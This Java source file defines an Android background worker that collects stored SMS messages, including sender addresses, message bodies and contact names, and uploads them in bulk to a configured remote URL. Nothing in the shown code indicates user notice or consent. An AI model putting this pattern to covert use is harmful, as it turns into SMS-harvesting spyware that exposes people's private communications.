package com.mmutinda.testapp.workers;

import android.app.Application;
import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.mmutinda.testapp.Config;
import com.mmutinda.testapp.Repository;
import com.mmutinda.testapp.entities.SmsEntity;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SampleWorker extends Worker {
    public static final String TAG = "SampleWorker";
    private SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    public SampleWorker(
            @NonNull Context appContext,
            @NonNull WorkerParameters workerParams) {
        super(appContext, workerParams);
    }


    @NonNull
    @Override
    public Result doWork() {
        Log.d(TAG, "doWork: starting");
        Repository repository = new Repository((Application) getApplicationContext());
        List<SmsEntity> smsEntities = repository.getUnsyncedDataSynchronously();
        Log.d(TAG, "doWork: " + smsEntities.size());

        JSONArray jsonArray = new JSONArray();
        for (int i = 0; i < smsEntities.size(); i++) {
            try {

                JSONObject jsonObjectRequest = new JSONObject();
                SmsEntity e = smsEntities.get(i);
                jsonObjectRequest.put("_id", e.get_id());
                jsonObjectRequest.put("address", e.getAddress());
                jsonObjectRequest.put("body", e.getBody());
                jsonObjectRequest.put("contactName", e.getContactName());
                jsonObjectRequest.put("timestamp", e.getTimestamp());
                jsonObjectRequest.put("type", e.getType());
                jsonObjectRequest.put("created_at", df.format(new Date()));
                jsonArray.put(i, jsonObjectRequest);

            } catch (JSONException eex) {
                Log.d(TAG, "doWork: " + eex.getMessage());
            }
        }

        OkHttpClient client = new OkHttpClient();
        RequestBody requestBody = new FormBody.Builder()
                .add("data", jsonArray.toString())
                .build();


        Request request = new Request.Builder()
                .url(Config.UPLOAD_URL)
                .post(requestBody)
                .build();
        try {
            Response response = client.newCall(request).execute();
            String res = response.body().string();

            JSONObject respObj = new JSONObject(res);
            if (respObj.getString("error").equals("false")) {
                Log.d(TAG, "doWork: upload complete");
                // update all as synced...
                repository.updateAllToSynced();
            }

            return Result.success();
        } catch (IOException | JSONException e) {
            Log.d(TAG, "doWork: " + e.getMessage());
            return Result.failure();
        }

    }


}
